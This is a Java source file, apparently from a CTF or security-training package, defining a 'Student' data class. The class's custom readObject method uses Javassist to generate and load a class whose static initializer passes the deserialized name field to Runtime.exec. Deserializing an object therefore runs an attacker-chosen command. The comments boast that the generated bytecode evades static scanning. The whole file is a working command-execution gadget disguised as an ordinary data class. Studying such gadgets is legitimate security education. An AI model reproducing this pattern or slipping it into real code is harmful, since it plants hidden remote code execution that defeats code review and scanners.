package com.ctfstu.class06;

import javassist.ClassPool;
import javassist.CtClass;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;

/**
 * Class06 — Javassist 字节码注入版 readObject
 *
 * 不再写反射调用链，而是运行时动态生成一个全新的类，
 * 在静态代码块中注入命令，加载类时自动触发执行。
 * 生成的字节码完全不在源码中，静态扫描无法检测。
 */
public class Student implements Serializable {
    private static final long serialVersionUID = 1L;
    private String name;
    private int age;

    public Student() {}

    public Student(String name, int age) {
        this.name = name;
        this.age = age;
    }

    public String getName() { return name; }
    public void setName(String name) { this.name = name; }
    public int getAge() { return age; }
    public void setAge(int age) { this.age = age; }

    // ========================
    // Javassist 版 readObject：
    // 动态生成字节码 → 加载 → 触发静态块 → 命令执行
    // ========================
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();

        try {
            // 1. 获取类池
            ClassPool pool = ClassPool.getDefault();

            // 2. 创建新类
            CtClass cc = pool.makeClass("Evil" + System.nanoTime());

            // 3. 在静态代码块中注入命令
            //    cc.toClass() 加载类时会自动触发静态代码块
            String execCmd = name.replace("\"", "\\\"").replace("\\", "\\\\");
            String cmd = "java.lang.Runtime.getRuntime().exec(\"" + execCmd + "\");";
            cc.makeClassInitializer().insertBefore(cmd);

            // 4. 使用 Javassist 内置的 toClass() 加载并初始化类
            //    注意：toClass() 仅 defineClass，需额外触发初始化
            Class<?> evilClass = cc.toClass();

            // 5. 通过 newInstance() 触发类初始化 → 运行静态代码块
            //    只有类被首次"主动使用"时，JVM 才会执行 <clinit>
            evilClass.newInstance();

        } catch (Exception e) {
            // 将根因信息也包含在错误消息中
            String detail = e.getClass().getName() + ": " + e.getMessage();
            if (e.getCause() != null) {
                detail += " => " + e.getCause().getClass().getName() + ": " + e.getCause().getMessage();
            }
            throw new RuntimeException("Javassist 字节码注入失败: " + detail, e);
        }
    }

    @Override
    public String toString() {
        return "Student{name = " + name + ", age = " + age + "}";
    }
}
